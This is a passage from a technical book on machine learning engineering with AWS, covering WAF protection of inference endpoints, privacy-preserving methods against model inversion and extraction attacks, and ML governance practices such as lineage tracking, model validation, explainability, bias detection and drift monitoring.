<p>Before we end this section, let’s quickly discuss how we can protect ML inference endpoints using firewalls. In <a href="B18638_03.xhtml#_idTextAnchor060"><em class="italic">Chapter 3</em></a>, <em class="italic">Deep Learning Containers</em>, we deployed our ML model inside a Lambda function using the custom container image support of the service. Then, we <a id="_idIndexMarker1145"/>set up and configured an API Gateway HTTP API trigger that triggered the Lambda function when there were new endpoint requests. If we want to secure this setup and make this serverless API <a id="_idIndexMarker1146"/>available for public use, we can configure an <strong class="bold">AWS Web Application Firewall</strong> (<strong class="bold">WAF</strong>) to protect this, as shown in the following diagram:</p>
<div>
<div class="IMG---Figure" id="_idContainer281">
<img alt="Figure 9.3 – Using AWS WAF to protect API endpoints " height="300" src="image/B18638_09_003.jpg" width="1145"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.3 – Using AWS WAF to protect API endpoints</p>
<p>AWS WAF protects <a id="_idIndexMarker1147"/>deployed web applications <a id="_idIndexMarker1148"/>from exploits that take advantage <a id="_idIndexMarker1149"/>of existing vulnerabilities through the use of “rules,” which address issues including emerging <strong class="bold">Common Vulnerabilities and Exposures</strong> (<strong class="bold">CVEs</strong>), <strong class="bold">Open Web Application Security Project</strong> (<strong class="bold">OWASP</strong>) top 10 vulnerabilities, and more.</p>
<p class="callout-heading">Note</p>
<p class="callout">Note that this <a id="_idIndexMarker1150"/>solution will also work if we have an API Gateway <a id="_idIndexMarker1151"/>interfacing with a SageMaker Inference endpoint – whether <a id="_idIndexMarker1152"/>we use the <strong class="bold">API Gateway mapping templates</strong> or a <strong class="bold">Lambda function</strong> to invoke the SageMaker inference endpoint. We can also use AWS WAF to <a id="_idIndexMarker1153"/>secure our <strong class="bold">Amazon CloudFront</strong> and <strong class="bold">Application Load Balancer</strong> (<strong class="bold">ALB</strong>) resources to protect EC2 instances running ML inference endpoints behind the ALB.</p>
<p>At this point, we should have a good idea of the different solutions and strategies when managing the security and compliance of ML environments. In the next section, we will dive deeper into the different techniques for preserving data privacy and model privacy.</p>
<h1 id="_idParaDest-183"><a id="_idTextAnchor196"/>Preserving data privacy and model privacy</h1>
<p>When dealing with ML and ML engineering requirements, we need to make sure that we protect the <a id="_idIndexMarker1154"/>training data, along with the parameters of the generated model, from <a id="_idIndexMarker1155"/>attackers. When given the chance, these malicious actors will perform a variety of attacks to extract the parameters of the trained model or even recover the data used to train the model. This means that PII may be revealed and stolen. If the model parameters are compromised, the attacker may be able to perform inference on their end by recreating the model that your company took months or years to develop. <em class="italic">Scary, right?</em> Let’s share a few examples of attacks that can be performed by attackers:</p>
<ul>
<li><strong class="bold">Model inversion attack</strong>: The attacker <a id="_idIndexMarker1156"/>attempts to recover the dataset used to train the model.</li>
<li><strong class="bold">Model extraction attack</strong>: The attacker <a id="_idIndexMarker1157"/>tries to steal the trained model using the prediction output values.</li>
<li><strong class="bold">Membership inference attack</strong>: The attacker attempts to infer if a record is part <a id="_idIndexMarker1158"/>of the training dataset used to train a model.</li>
<li><strong class="bold">Attribute inference attack</strong>: The <a id="_idIndexMarker1159"/>attacker tries to guess the missing attributes of a training record (using partial information available).</li>
</ul>
<p>Now that we have <a id="_idIndexMarker1160"/>a better idea of some of the possible attacks, let’s discuss <a id="_idIndexMarker1161"/>the solutions and defense mechanisms we can use to preserve the privacy of the data and the models.</p>
<h2 id="_idParaDest-184"><a id="_idTextAnchor197"/>Federated Learning</h2>
<p>Let’s start by talking <a id="_idIndexMarker1162"/>about <strong class="bold">federated learning</strong>, but before we do that, let’s compare it with the typical way we perform ML training and deployment, which is <em class="italic">centralized</em>:</p>
<div>
<div class="IMG---Figure" id="_idContainer282">
<img alt="Figure 9.4 – Centralized ML " height="378" src="image/B18638_09_004.jpg" width="859"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.4 – Centralized ML</p>
<p>Here, the data is collected from the mobile devices of the users into a centralized location where the ML model training step is performed on a single machine (or a cluster of machines using distributed training). There are issues concerning the ownership, privacy, and <a id="_idIndexMarker1163"/>locality of the data with this approach since the data sent to the centralized location may contain sensitive information about the users. To manage these types of issues, we can utilize Federated Learning, where the training step is performed within the edge devices directly, as shown in the following diagram:</p>
<div>
<div class="IMG---Figure" id="_idContainer283">
<img alt="Figure 9.5 – Federated ML " height="375" src="image/B18638_09_005.jpg" width="681"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.5 – Federated ML</p>
<p>Here, only the models are sent back to a server and “merged” with each other to produce a new <a id="_idIndexMarker1164"/>global model. This helps solve <strong class="bold">privacy preservation</strong> issues since the data stays in the edge devices. In the <em class="italic">Deployment strategies and best practices</em> section of <a href="B18638_07.xhtml#_idTextAnchor151"><em class="italic">Chapter 7</em></a>, <em class="italic">SageMaker Deployment Solutions</em>, we mentioned that we can use <strong class="bold">SageMaker Edge Manager</strong> along with other services when deploying and managing ML models on edge devices. Here, we’re under the assumption that the models have already been trained and we’re just using these services during the deployment step. <em class="italic">How are the models trained?</em> Here are some of the possible solutions:</p>
<ul>
<li>Use solutions <a id="_idIndexMarker1165"/>such as <strong class="bold">TensorFlow Federated</strong> (<a href="https://www.tensorflow.org/federated">https://www.tensorflow.org/federated</a>) and <strong class="bold">PyTorch Mobile</strong> (<a href="https://pytorch.org/mobile/home/">https://pytorch.org/mobile/home/</a>), which <a id="_idIndexMarker1166"/>can be <a id="_idIndexMarker1167"/>used for Federated <a id="_idIndexMarker1168"/>ML requirements.</li>
<li>Use solutions <a id="_idIndexMarker1169"/>such as the <strong class="bold">Flower</strong> (<a href="https://flower.dev/">https://flower.dev/</a>) framework, along <a id="_idIndexMarker1170"/>with services such as <strong class="bold">AWS IoT Greengrass</strong>, <strong class="bold">Amazon ECS</strong>, and <strong class="bold">AWS Step Functions</strong> to manage training cluster <a id="_idIndexMarker1171"/>unpredictability <a id="_idIndexMarker1172"/>and coordinator-to-device <a id="_idIndexMarker1173"/>challenges when performing federated learning with edge devices.</li>
<li>Use solutions <a id="_idIndexMarker1174"/>such as <strong class="source-inline">OpenMined/SwiftSyft</strong> (on iOS devices) and <strong class="source-inline">OpenMined/KotlinSyft</strong> (on Android devices) to train and deploy <strong class="bold">PySyft</strong> models written with <strong class="bold">TensorFlow</strong> or <strong class="bold">PyTorch</strong>. </li>
</ul>
<p class="callout-heading">Note</p>
<p class="callout">What’s <strong class="bold">PySyft</strong>? It’s a library from <strong class="bold">OpenMined</strong> that utilizes Federated Learning, differential privacy, and <a id="_idIndexMarker1175"/>encrypted computation for secure and private deep <a id="_idIndexMarker1176"/>learning requirements. If you’re wondering <a id="_idIndexMarker1177"/>what <strong class="bold">Differential Privacy</strong> and <strong class="bold">Encrypted Computation</strong> are, we’ll discuss these now!</p>
<h2 id="_idParaDest-185"><a id="_idTextAnchor198"/>Differential Privacy</h2>
<p>Now, let’s talk about <strong class="bold">Differential Privacy</strong>. Differential Privacy involves using techniques that protect <a id="_idIndexMarker1178"/>the information that’s shared about individual records in the dataset, which will give attackers a harder time reverse engineering the original data. These techniques include the addition of a carefully designed amount of random noise to the training data or model parameters when producing statistics. Here are some examples and solutions:</p>
<ul>
<li>Using a variant called <strong class="bold">Metric Differential Privacy</strong> while training <strong class="bold">natural language processing</strong> (<strong class="bold">NLP</strong>) models <a id="_idIndexMarker1179"/>and analyzing data <a id="_idIndexMarker1180"/>in SageMaker. Here, the “meaning” of the words in the training dataset is preserved while protecting the privacy of individual records. For more information, check out <a href="https://www.amazon.science/blog/preserving-privacy-in-analyses-of-textual-data">https://www.amazon.science/blog/preserving-privacy-in-analyses-of-textual-data</a>.</li>
<li>Using the open source <strong class="bold">TensorFlow Privacy</strong> library when training privacy preserving ML <a id="_idIndexMarker1181"/>models with minimal code changes to existing <a id="_idIndexMarker1182"/>TensorFlow code. For more information, check out <a href="https://blog.tensorflow.org/2019/03/introducing-tensorflow-privacy-learning.xhtml">https://blog.tensorflow.org/2019/03/introducing-tensorflow-privacy-learning.xhtml</a>.</li>
<li>Using the open <a id="_idIndexMarker1183"/>source <strong class="bold">Opacus</strong> library to train PyTorch models while <a id="_idIndexMarker1184"/>enabling Differential Privacy. For more <a id="_idIndexMarker1185"/>information, check out <a href="https://opacus.ai/">https://opacus.ai/</a>.</li>
</ul>
<p class="callout-heading">Note</p>
<p class="callout">If you are wondering how these solutions can be used in AWS, we simply need to install the required packages and libraries (for example, <strong class="source-inline">opacus</strong>) inside the resources where we will perform <a id="_idIndexMarker1186"/>the ML experiments. For example, if we launched an EC2 instance using a <strong class="bold">Deep Learning AMI</strong>, similar to what we did in <a href="B18638_02.xhtml#_idTextAnchor041"><em class="italic">Chapter 2</em></a>, <em class="italic">Deep Learning AMIs</em>, we can simply install the required libraries using the Terminal (for example, <strong class="source-inline">pip install opacus</strong>). If we are using <strong class="bold">deep learning containers</strong>, similar <a id="_idIndexMarker1187"/>to what we did in <a href="B18638_03.xhtml#_idTextAnchor060"><em class="italic">Chapter 3</em></a>, <em class="italic">Deep Learning Containers</em>, we can extend a pre-built container image and include the needed libraries and packages while configuring the updated container environment. If we want to use these inside SageMaker, we’ll just need to update the <strong class="source-inline">requirements.txt</strong> file when <a id="_idIndexMarker1188"/>using <strong class="bold">script mode</strong> or provide a custom container image that will be used by SageMaker.</p>
<h2 id="_idParaDest-186"><a id="_idTextAnchor199"/>Privacy-preserving machine learning</h2>
<p>There’s also a class of techniques under <strong class="bold">privacy-preserving machine learning</strong> (<strong class="bold">PPML</strong>) where ML <a id="_idIndexMarker1189"/>inference can be performed even if the input payload passed to the model is encrypted. This means that we can protect and encrypt sensitive data before it’s passed as the payload to an ML inference endpoint. After the PPML model is used for inference on the encrypted payload, the results are returned to the sender encrypted. The final step would be for the sender to <a id="_idIndexMarker1190"/>decrypt the results. <em class="italic">Pretty cool, right?</em> An example of this would be a <strong class="bold">privacy-preserving XGBoost model</strong> that makes <a id="_idIndexMarker1191"/>use of privacy-preserving encryption schemes <a id="_idIndexMarker1192"/>and tools such as <strong class="bold">order-preserving encryption</strong> (<strong class="bold">OPE</strong>), <strong class="bold">pseudo-random functions</strong> (<strong class="bold">PRFs</strong>), and <strong class="bold">additively homomorphic encryption</strong> (<strong class="bold">AHE</strong>) to make predictions on encrypted queries. We can use a <a id="_idIndexMarker1193"/>custom container image when deploying the privacy-preserving XGBoost model using the <strong class="bold">SageMaker hosting services</strong> so that we <a id="_idIndexMarker1194"/>have a bit more flexibility when it comes to the packages and code used during inference. Note that PPML adds some computational overhead, and the resulting models are generally slower <a id="_idIndexMarker1195"/>in terms of performance compared to the unencrypted versions.</p>
<p class="callout-heading">Note</p>
<p class="callout">We won’t dive <a id="_idIndexMarker1196"/>deep into the details of how PPML works in this book. For more information, check out <a href="https://www.amazon.science/publications/privacy-preserving-xgboost-inference">https://www.amazon.science/publications/privacy-preserving-xgboost-inference</a>.</p>
<h2 id="_idParaDest-187"><a id="_idTextAnchor200"/>Other solutions and options</h2>
<p>Finally, when it comes to managing data privacy, data science teams should make the most out of <a id="_idIndexMarker1197"/>the existing security features and capabilities of the services and tools they are using. In addition to what was mentioned in the other sections of this chapter, here are other services and capabilities available for us when protecting our data in AWS:</p>
<ul>
<li><strong class="bold">Amazon Macie</strong>: Used to <a id="_idIndexMarker1198"/>assess the data privacy and security of the data stored in S3 through automated discovery of sensitive data such as PII.</li>
<li><strong class="bold">Redshift support for row-level security and column-level access control</strong>: Used to enable fine-grained access to the rows and columns in the tables in Redshift.</li>
<li><strong class="bold">Redshift data masking using views</strong>: You can use views to prepare a masked version of the data stored in Redshift tables (for example, <strong class="source-inline">*******@email.com</strong> instead of <strong class="source-inline">johndoe@email.com</strong>).</li>
<li><strong class="bold">Redshift support for cross-account data sharing</strong>: Used to share the data stored in a Redshift warehouse across AWS accounts (so that the data no longer needs to be copied and transferred to another account when access needs to be shared).</li>
<li><strong class="bold">Amazon OpenSearch Service field masking support</strong>: This uses pattern-based field masking to hide sensitive data such as PII when performing a search query in the Amazon OpenSearch service.</li>
<li><strong class="bold">S3 Object Lambda</strong>: Custom <a id="_idIndexMarker1199"/>code is used to process and modify the output of S3 GET requests (which includes the ability to mask and redact data).</li>
<li><strong class="bold">AWS Lake Formation support for row-level and cell-level security</strong>: This enables fine-grained access to query results and AWS Glue ETL jobs.</li>
<li><strong class="bold">Principal Component Analysis (SageMaker built-in algorithm)</strong>: A PCA-based <a id="_idIndexMarker1200"/>transformation that’s used to preserve data privacy while preserving the “nature” of the data.</li>
</ul>
<p>At this point, we <a id="_idIndexMarker1201"/>should have a better understanding of the different approaches to managing data and model privacy. In the next section, we will talk about ML governance, and we will discuss the different solutions available in AWS.</p>
<h1 id="_idParaDest-188"><a id="_idTextAnchor201"/>Establishing ML governance</h1>
<p>When working on ML initiatives and requirements, ML governance must be taken into account as early as <a id="_idIndexMarker1202"/>possible. Companies and teams with poor governance experience both short-term and long-term issues due to the following reasons: </p>
<ul>
<li><em class="italic">The absence of clear and accurate inventory tracking of ML models</em></li>
<li><em class="italic">Limitations concerning model explainability and interpretability</em></li>
<li><em class="italic">The existence of bias in the training data</em></li>
<li><em class="italic">Inconsistencies in the training and inference data distributions</em> </li>
<li><em class="italic">The absence of automated experiment lineage tracking processes</em></li>
</ul>
<p><em class="italic">How do we deal with these issues and challenges?</em> We can solve and manage these issues by establishing ML governance (the right way) and making sure that the following areas are <a id="_idIndexMarker1203"/>taken into account:</p>
<ul>
<li>Lineage tracking and reproducibility</li>
<li>Model inventory</li>
<li>Model validation</li>
<li>ML explainability</li>
<li>Bias detection</li>
<li>Model monitoring</li>
<li>Data analysis and data quality reporting</li>
<li>Data integrity management</li>
</ul>
<p>We will discuss each of these in detail in this section. Feel free to get a cup of coffee or tea before proceeding!</p>
<h2 id="_idParaDest-189"><a id="_idTextAnchor202"/>Lineage Tracking and reproducibility</h2>
<p>In <a href="B18638_06.xhtml#_idTextAnchor132"><em class="italic">Chapter 6</em></a>, <em class="italic">SageMaker Training and Debugging Solutions</em>, we discussed how an ML model is <a id="_idIndexMarker1204"/>produced after using a training dataset, an algorithm, a <a id="_idIndexMarker1205"/>specific configuration of hyperparameter values, and other relevant training configuration parameter values as inputs to a training job.</p>
<p>Data scientists and ML practitioners must be able to verify that a model can be built and reproduced using the same set of configuration settings, along with other “inputs” such as the training dataset and the algorithm. If we were dealing with a single experiment, manually keeping track of these is relatively easy. Maybe storing this information in a spreadsheet or a markdown file would do the trick! As our requirements evolve, this information may get lost along the way, especially if done manually. That said, keeping track of this “history” or <strong class="bold">lineage</strong> would get much harder and trickier once we need to run multiple training experiments using a variety of combinations of hyperparameter configuration <a id="_idIndexMarker1206"/>values (for example, when using the <strong class="bold">Automatic Model Tuning</strong> capability <a id="_idIndexMarker1207"/>of SageMaker). The <a id="_idIndexMarker1208"/>good news is that SageMaker automatically helps us keep track of this with <strong class="bold">SageMaker ML Lineage Tracking</strong> and <strong class="bold">SageMaker Experiments</strong>. If we want <a id="_idIndexMarker1209"/>to see the experiment lineage along with <a id="_idIndexMarker1210"/>the other details, <strong class="bold">SageMaker Studio</strong> makes it easy for us to easily get this information with just a few clicks. </p>
<p class="callout-heading">Note</p>
<p class="callout">We can also get this information programmatically using code similar to what is available at (this snippet is from the book <em class="italic">Machine Learning with Amazon SageMaker Cookbook</em>) <a href="https://bit.ly/3POKbKf">https://bit.ly/3POKbKf</a>.</p>
<p>In addition to the automated experiment and lineage tracking performed by SageMaker, it is important to note that we can also manually create associations programmatically. We can also use <strong class="bold">boto3</strong> and the <strong class="bold">SageMaker Search</strong> API to get details and information about the training used to train the ML models. In most cases, we would be fine using the SageMaker Console, along with the search functionality available.</p>
<p>If you are using a deep learning framework to run training scripts on top of AWS compute services <a id="_idIndexMarker1211"/>such as EC2, ECS, or Lambda, you may use libraries such as <strong class="bold">ML Metadata</strong> (for TensorFlow) to keep track of the lineage, along with the artifacts of the different components in the ML pipeline.</p>
<p class="callout-heading">Note</p>
<p class="callout">For more <a id="_idIndexMarker1212"/>information about <strong class="bold">ML Metadata</strong>, check out <a href="https://www.tensorflow.org/tfx/tutorials/mlmd/mlmd_tutorial">https://www.tensorflow.org/tfx/tutorials/mlmd/mlmd_tutorial</a>.</p>
<h2 id="_idParaDest-190"><a id="_idTextAnchor203"/>Model inventory</h2>
<p>Managing model <a id="_idIndexMarker1213"/>inventory is crucial to establishing ML governance. Being able to maintain an organized model inventory allows key members of the data science team to know the current status and performance of models immediately.</p>
<p>There are different <a id="_idIndexMarker1214"/>ways to manage model inventory <a id="_idIndexMarker1215"/>in ML environments on AWS. One possible approach we <a id="_idIndexMarker1216"/>can do is to <a id="_idIndexMarker1217"/>build a custom solution using a <a id="_idIndexMarker1218"/>variety of services! For example, we may design and build a <em class="italic">serverless</em> model registry from <a id="_idIndexMarker1219"/>scratch using <strong class="bold">Amazon DynamoDB</strong>, <strong class="bold">Amazon S3</strong>, <strong class="bold">Amazon ECR</strong>, <strong class="bold">Amazon API Gateway</strong>, and <strong class="bold">AWS Lambda</strong>, as shown in the following diagram:</p>
<div>
<div class="IMG---Figure" id="_idContainer284">
<img alt="Figure 9.6 – Custom-built model registry " height="673" src="image/B18638_09_006.jpg" width="1209"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.6 – Custom-built model registry</p>
<p>In this custom <a id="_idIndexMarker1220"/>solution, we prepare the following Lambda functions:</p>
<ul>
<li><strong class="bold">UPLOAD MODEL PACKAGE</strong>: For uploading a model package (which includes the ML model artifacts, scripts for training and inference, container image for the environment where the scripts will run, and the model metadata)</li>
<li><strong class="bold">DESCRIBE MODEL PACKAGE</strong>: For getting the stored information about a model package including its status (if it’s in a <strong class="source-inline">PENDING</strong>, <strong class="source-inline">APPROVED</strong>, or <strong class="source-inline">REJECTED</strong> state), along with the identifiers and paths where the different components of the <a id="_idIndexMarker1221"/>model package are stored</li>
<li><strong class="bold">UPDATE MODEL STATUS</strong>: For updating the status of a model to <strong class="source-inline">PENDING</strong>, <strong class="source-inline">APPROVED</strong>, or <strong class="source-inline">REJECTED</strong></li>
</ul>
<p>We can easily add more Lambda functions in case we need to extend the functionality of this custom-built model registry. This option would give us the greatest amount of flexibility at the expense of a few days setting the entire system up.</p>
<p>Another option <a id="_idIndexMarker1222"/>would be to use an existing one such as <strong class="bold">MLFlow Model Registry</strong> and deploy it inside an EC2 instance or in an ECS <a id="_idIndexMarker1223"/>container. Finally, we can use <strong class="bold">SageMaker Model Registry</strong>, which already <a id="_idIndexMarker1224"/>has the model inventory management features we need, such as model approval and model life cycle tracking. </p>
<p class="callout-heading">Note</p>
<p class="callout">Feel free to check out <a href="B18638_08.xhtml#_idTextAnchor172"><em class="italic">Chapter 8</em></a>, <em class="italic">Model Monitoring and Management Solutions</em>, for more information and details on how to use SageMaker Model Registry.</p>
<h2 id="_idParaDest-191"><a id="_idTextAnchor204"/>Model validation</h2>
<p>After an ML model has been trained, it needs to be evaluated to check if its performance allows <a id="_idIndexMarker1225"/>certain business targets to be achieved. Data science teams also need to validate the choice of the model as simple models may be prone to <strong class="bold">underfitting</strong> while <a id="_idIndexMarker1226"/>complex models tend to be prone to <strong class="bold">overfitting</strong>. At the same <a id="_idIndexMarker1227"/>time, the metrics used for model validation need to be reviewed as the ability of some metrics to represent model performance depends <a id="_idIndexMarker1228"/>on the context of the problem being solved. For example, the <strong class="bold">balanced F-score</strong> may be a more meaningful option compared to <strong class="bold">accuracy</strong> for fraud detection use cases (since the model accuracy score can still be high due to class imbalance).</p>
<p class="callout-heading">Note</p>
<p class="callout">For more <a id="_idIndexMarker1229"/>information on the balanced F-score, feel free to check out <a href="https://en.wikipedia.org/wiki/F-score">https://en.wikipedia.org/wiki/F-score</a>.</p>
<p>The first way to <a id="_idIndexMarker1230"/>evaluate a model is through <strong class="bold">offline testing</strong>, where historical <a id="_idIndexMarker1231"/>data is used to evaluate the trained model. This may be done through <strong class="bold">validation using a “holdout set”</strong>, which is data not used for <a id="_idIndexMarker1232"/>model training. Another option would be to use <strong class="bold">k-fold cross-validation</strong>, which is a popular technique to detect overfitting. Offline testing can be performed when using SageMaker in a variety of ways:</p>
<ul>
<li>The model files (stored inside a <strong class="source-inline">model.tar.gz</strong> file) generated after a SageMaker training job can be loaded and evaluated without the existence of a SageMaker Inference Endpoint using the appropriate library or framework. For example, a <strong class="bold">Linear Learner</strong> model trained <a id="_idIndexMarker1233"/>using SageMaker can be <a id="_idIndexMarker1234"/>loaded using <strong class="bold">MXNet</strong> (for example, within a custom application running in a container), as shown in the following block of code:<pre class="source-code">def <strong class="bold">load_model</strong>():</pre><pre class="source-code">    sym_json = <strong class="bold">json_load</strong>(open('mx-mod-symbol.json')) </pre><pre class="source-code">    sym_json_string = <strong class="bold">json_dumps</strong>(sym_json)</pre><pre class="source-code">    model = gluon.nn.<strong class="bold">SymbolBlock</strong>( </pre><pre class="source-code">        outputs=mxnet.sym.load_json(sym_json_string), </pre><pre class="source-code">        inputs=mxnet.sym.var('data'))</pre><pre class="source-code">    model.<strong class="bold">load_parameters</strong>(</pre><pre class="source-code">        'mx-mod-0000.params', </pre><pre class="source-code">        allow_missing=True</pre><pre class="source-code">    )</pre><pre class="source-code">    model.<strong class="bold">initialize</strong>()</pre><pre class="source-code">    </pre><pre class="source-code">    return model</pre></li>
</ul>
<p class="list-inset">Once the model has been evaluated, it can be deployed to an inference endpoint.</p>
<ul>
<li>An alternative would be to deploy the model into an “alpha” ML inference endpoint and <a id="_idIndexMarker1235"/>evaluate it using historical data. Once the evaluation step has been completed, the model can be deployed into the “production” ML inference endpoint and the “alpha” endpoint can be deleted.</li>
</ul>
<p>The other approach involves <strong class="bold">online testing</strong>, where live data is used to evaluate the model. Online testing can be <a id="_idIndexMarker1236"/>performed using SageMaker through its A/B testing support, where two or more models can be deployed under one inference endpoint. With this approach, a small percentage of the traffic can be routed to the variant of the model that’s being validated for a certain period. Once the validation step is complete, 100% of the traffic can be routed to one of the variants completely.</p>
<p class="callout-heading">Note</p>
<p class="callout">Check out the following Notebook for an example of how to set up A/B testing of multiple models using SageMaker: <a href="https://bit.ly/3uSRZSE">https://bit.ly/3uSRZSE</a>.</p>
<p>Now that we’ve discussed model evaluation, let’s dive a bit deeper into ML explainability.</p>
<h2 id="_idParaDest-192"><a id="_idTextAnchor205"/>ML explainability</h2>
<p>In some cases, business owners and stakeholders reject the usage of certain types of models <a id="_idIndexMarker1237"/>due to issues concerning ML explainability. Sometimes, due to the complexity of an ML model, it is difficult to conceptually explain how it works or how it produces the prediction or inference result. Stakeholders have a higher chance of approving the usage of certain models once they have more visibility and understanding of how ML models have produced the output. This involves understanding how much each feature contributes to the model’s predicted output value.</p>
<p class="callout-heading">Note</p>
<p class="callout">Note that <strong class="bold">model interpretability</strong> and <strong class="bold">model explainability</strong> are often interchanged by ML <a id="_idIndexMarker1238"/>practitioners. However, these two terms are different and should be used <a id="_idIndexMarker1239"/>with care. Interpretability focuses on how an ML model works – that is, how it works internally. On the other hand, explainability focuses on the behavior of an ML model, which includes how the input feature <a id="_idIndexMarker1240"/>values contribute to the predicted output value. For more information on this topic, feel free to check out <a href="https://docs.aws.amazon.com/whitepapers/latest/model-explainability-aws-ai-ml/interpretability-versus-explainability.xhtml">https://docs.aws.amazon.com/whitepapers/latest/model-explainability-aws-ai-ml/interpretability-versus-explainability.xhtml</a>. </p>
<p>ML explainability can be approached with <strong class="bold">global explainability</strong> and <strong class="bold">local explainability</strong>. We can <a id="_idIndexMarker1241"/>say that global explainability has been achieved if we’re <a id="_idIndexMarker1242"/>able to identify how much each feature contributes <a id="_idIndexMarker1243"/>to the model’s prediction across all predictions. On the other hand, local explainability can be achieved if we’re able to identify how much each feature contributes to the model’s prediction for a single record (or data point).</p>
<p class="callout-heading">Note</p>
<p class="callout">For more information <a id="_idIndexMarker1244"/>about ML explainability, check out <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/clarify-model-explainability.xhtml">https://docs.aws.amazon.com/sagemaker/latest/dg/clarify-model-explainability.xhtml</a>.</p>
<p>Here are some <a id="_idIndexMarker1245"/>of the possible solutions when generating ML explainability reports:</p>
<ul>
<li>Use open source libraries (for example, the <strong class="source-inline">shap</strong> library) and implement a custom solution deployed in an <strong class="bold">AWS Lambda</strong> function or an <strong class="bold">Amazon ECS</strong> container.</li>
<li>Use <strong class="bold">SageMaker Clarify</strong> to run a job and generate explainability reports:<pre class="source-code">processor = <strong class="bold">SageMakerClarifyProcessor</strong>(...)</pre><pre class="source-code">processor.<strong class="bold">run_explainability</strong>(...)</pre></li>
<li>Use open source libraries (for example, the <strong class="source-inline">shap</strong> library) and use <strong class="bold">SageMaker Processing</strong> to run the custom code, along with a custom container image.</li>
</ul>
<p>Now that we’ve talked <a id="_idIndexMarker1246"/>about ML Explainability, let’s jump into how to perform ML bias detection using a variety of solutions on AWS.</p>
<h2 id="_idParaDest-193"><a id="_idTextAnchor206"/>Bias detection</h2>
<p>Detecting ML bias is critical to the success of any ML project. If ML bias is not detected and mitigated, automated <a id="_idIndexMarker1247"/>systems utilizing ML models may end up with unfair predictions. For example, an ML-based recruitment application may make unfair candidate selections against certain groups (for example, against female candidates). Another example would be an automated loan application that rejects loan applications from under-represented groups (for example, those living in specific countries).</p>
<p>ML bias can be measured using a variety of metrics. Here are some of the metrics that can be used to <a id="_idIndexMarker1248"/>measure ML bias:</p>
<ul>
<li><strong class="bold">Class imbalance</strong>: This measures <a id="_idIndexMarker1249"/>and detects any imbalance in the number of members between different groups.</li>
<li><strong class="bold">Label imbalance</strong>: This measures <a id="_idIndexMarker1250"/>and detects any imbalance in the positive outcomes between different groups.</li>
<li><strong class="bold">Kullback-Leibler (KL) divergence</strong>: This compares and measures how different <a id="_idIndexMarker1251"/>the outcome distributions of different groups are.</li>
<li><strong class="bold">Jensen-Shannon (JS) divergence</strong>: Similar to KL divergence, JS divergence compares <a id="_idIndexMarker1252"/>and measures how different the outcome distributions of different groups are.</li>
</ul>
<p class="callout-heading">Note</p>
<p class="callout">If you’re interested in <a id="_idIndexMarker1253"/>learning more about the different metrics to measure ML bias, check out <a href="https://docs.aws.amazon.com/sagemaker/latest/dg/clarify-measure-data-bias.xhtml">https://docs.aws.amazon.com/sagemaker/latest/dg/clarify-measure-data-bias.xhtml</a>.</p>
<p>Here are some of the possible solutions when using AWS services and capabilities to detect ML bias:</p>
<ul>
<li>Use open source libraries (for example, <strong class="source-inline">ResponsiblyAI/responsibly</strong>) and implement a custom solution deployed in an <strong class="bold">AWS Lambda</strong> function or an <strong class="bold">Amazon ECS</strong> container.</li>
<li>Use <strong class="bold">SageMaker Clarify</strong> to run a job and generate pre-training and post-training bias reports:<pre class="source-code">processor = <strong class="bold">SageMakerClarifyProcessor</strong>(...)</pre><pre class="source-code">processor.<strong class="bold">run_bias</strong>(...)</pre></li>
<li>Use open source libraries (for example, <strong class="source-inline">ResponsiblyAI/responsibly</strong> library) and use <strong class="bold">SageMaker Processing</strong> to run the custom code, along with a custom container image.</li>
<li>Use <strong class="bold">SageMaker Model Monitor</strong> with <strong class="bold">SageMaker Clarify</strong> to monitor bias drift in models deployed in an inference endpoint.</li>
</ul>
<p>After detecting ML bias, the <a id="_idIndexMarker1254"/>next step is to resolve and mitigate the issue(s) through a variety of means (depending on the context and type of ML bias). We won’t discuss the different bias mitigation strategies in this book, so feel free to check out https://sagemaker-examples.readthedocs.io/en/latest/end_to_end/fraud_detection/3-mitigate-bias-train-model2-registry-e2e.xhtml#Develop-an-Unbiased-Model for a quick end-to-end example.</p>
<h2 id="_idParaDest-194"><a id="_idTextAnchor207"/>Model monitoring</h2>
<p>In <a href="B18638_08.xhtml#_idTextAnchor172"><em class="italic">Chapter 8</em></a>, <em class="italic">Model Monitoring and Management Solutions</em>, we enabled data capture in an ML inference endpoint and then set up scheduled monitoring, which detects violations <a id="_idIndexMarker1255"/>and data quality issues from the data captured. This setup will help us detect any inconsistencies as early as possible so that corrective measures can be applied right away. <em class="italic">What will happen if these issues and inconsistencies are not corrected?</em> If corrective measures are not applied right away, the deployed model may experience performance decay or degradation until the “fixes” have been applied. Of course, before any corrections can be applied, we need to detect these inconsistencies first. That said, our next question would be, <em class="italic">How do we detect these inconsistencies and issues?</em></p>
<div>
<div class="IMG---Figure" id="_idContainer285">
<img alt="Figure 9.7 – Detecting drift " height="747" src="image/B18638_09_007.jpg" width="1276"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 9.7 – Detecting drift</p>
<p>In the preceding <a id="_idIndexMarker1256"/>diagram, we can see that we can detect “drift” by performing the required analysis (for example, data quality checks) on the baseline dataset and on the captured ML inference data (which passed through the ML inference endpoint). Once the required analysis is complete, the results of both the baseline dataset and the captured ML inference data are compared to see if the differences in the results exceed a certain threshold.</p>
<p>Note that we can detect the following issues using <strong class="bold">SageMaker Model Monitor</strong>:</p>
<ul>
<li><strong class="bold">Data quality drift</strong>: This is <a id="_idIndexMarker1257"/>detected by comparing the following: <ul><li><strong class="bold">[“PROPERTIES” – A]</strong>: The statistical nature and the properties (for example, data type) of the baseline dataset used to train the model deployed  </li>
<li><strong class="bold">[“PROPERTIES” – B]</strong>: The properties <a id="_idIndexMarker1258"/>of the capture ML inference data</li>
</ul></li>
<li><strong class="bold">Model performance drift</strong>: This is <a id="_idIndexMarker1259"/>detected by comparing the following: <ul><li><strong class="bold">[“PROPERTIES” – A]</strong>: The performance of the model on the baseline dataset </li>
<li><strong class="bold">[“PROPERTIES” – B]</strong>: The performance of the model on the captured ML inference data (merged with uploaded ground truth labels)</li>
</ul></li>
